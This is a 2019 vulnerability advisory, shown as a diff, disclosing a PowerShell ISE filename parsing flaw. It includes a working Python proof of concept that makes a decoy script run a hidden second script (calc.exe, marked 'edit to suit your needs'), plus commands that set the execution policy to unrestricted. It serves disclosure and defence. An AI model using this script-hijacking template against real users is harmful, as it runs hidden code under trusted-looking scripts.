@@ -1,0 +1,155 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/WINDOWS-POWERSHELL-ISE-FILENAME-PARSING-FLAW-RCE-0DAY.txt 
+[+] ISR: ApparitionSec          
+[+] Zero Day Initiative Program
+
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Windows PowerShell ISE
+
+The Windows PowerShell Integrated Scripting Environment (ISE) is a host application for Windows PowerShell.
+In the ISE, you can run commands and write, test, and debug scripts in a single Windows-based graphic user interface.
+
+
+[Vulnerability Type]
+Filename Parsing Flaw Remote Code Execution 0day
+
+
+[References]
+ZDI-CAN-8005
+
+
+[Security Issue]
+Windows PowerShell ISE will execute wrongly supplied code when debugging specially crafted PowerShell scripts that contain
+array brackets as part of the filename. This can result in ISE executing attacker supplied scripts pointed to by the filename
+and not the "trusted" PS file currently loaded and being viewed by a user in the host application. This undermines the integrity of
+PowerShell ISE allowing potential unexpected remote code execution.
+
+In PowerShell brackets are used to access array elements.
+
+PS C:\> $a=1..10
+PS C:\> $a[4]
+5
+
+However, when brackets are used as part of the filename it can be used to hijack the currently loaded file in place of another malicious file.
+That file must contain a single matching char value which is also found in our specially crafted filename.
+
+Requirements are both files must reside in the same directory. Example, if a file named [HelloWorldTutoria1].ps1 resides alongside a
+file named 1.ps1 it will create a script hijacking condition. Note, the last letter is a number "1" not a lowercase "L".
+
+Other things I discovered playing with PS filenames is we can target scripts using a single alphabetic or numeric char and certain symbols.
+PowerShell scripts with only a single quote also work, [Pwned'].ps1 will load and execute ===> '.ps1 if debugged from the vuln ISE application.
+
+These chars also get the job done:
+"$" "_" "#" "^"  plus any single case insensitive letter a-z or numbers 0-9, [Hello_World].ps1 ====> _.ps1
+
+[Hello].ps1 will execute this instead =====> h.ps1
+
+Dashes "-" throw the following error: "The specified wildcard character pattern is not valid: [Hello-World].ps1" when pointing to
+another PS file named -.ps1 and seems to treat it sort of like a meta-character.
+
+[pw3d].ps1 <===== expected to execute
+
+3.ps1 <===== actually executed
+
+This exploits the trust between PowerShell ISE and the end user. So scripts debugged local or over a network share display "trusted" code
+in ISE that is expected to run. However, when the user debugs the script a different script gets executed.
+Interestingly, that second script does NOT get loaded into PowerShell ISE upon execution, so a user may not see anything amiss.
+
+User interaction is required for a successful attack to occur and obviously running any unknown PowerShell script can be dangerous. 
+Again, this exploit takes advantage of "trust" where users can see and read the code and will trust it as everything looks just fine and
+yet ... still they get PWNED!.
+
+Tested successfully on Win7/10
+
+Long live user interaction! lol...
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=T2I_-iUPaFw
+
+
+[Exploit/POC]
+After opening PS files in ISE, set the execution policy so can test without issues.
+set-executionpolicy unrestricted -force
+
+PS scripts over Network shares may get 'RemoteSigned' security policy issue so run below cmd.
+
+set-executionpolicy unrestricted -force process
+Choose 'R' to run once.
+
+Below Python script will create two .ps1 files to demonstrate the vulnerable condition.
+Examine the code, what does it say? it reads... Write-output "Hello World!"... now Run it...
+
+BAM! other PS script executes!.
+
+
+#PowerShell ISE 0day Xploit
+#ZDI-CAN-8005
+#ZDI CVSS: 7.0
+#hyp3rlinx
+#ApparitionSec
+
+
+fname1="[HelloWorldTutoria1].ps1"    #Expected code to run is 'HelloWorld!'
+fname2="1.ps1"                       #Actual code executed is calc.exe for Poc
+evil_code="start calc.exe"           #Edit to suit your needs.
+c=0
+payload1='Write-Output "Hello World!"'
+payload2=evil_code+"\n"+'Write-Output "Hello World!"'
+
+def mk_ps_hijack_script():
+    global c
+    c+=1
+    f=open(globals()["fname"+str(c)],"wb")
+    f.write(globals()["payload"+str(c)])
+    f.close()
+    if c<2:
+        mk_ps_hijack_script()
+        
+
+if __name__=="__main__":
+    mk_ps_hijack_script()
+    print "PowerShell ISE Xploit 0day Files Created!"
+    print "Discovery by hyp3rlinx"
+    print "ZDI-CAN-8005"
+
+
+
+[Network Access]
+Remote
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+ZDI Case opened : 2019-02-06
+Case officially contracted to ZDI : 2019-02-20
+
+Vendor Disclosure : 2019-03-01
+submitted to the vendor as ZDI-CAN-8005.
+
+April 25, 2019 : MSRC response (as per ZDI): "we've determined that this doesn't meet the bar for servicing via a security update.
+we have opened a bug with the PowerShell team, and this is something they may address in a future release as a form of defense-in-depth."
+
+ZDI also indicated they too will close the case.
+May 1, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
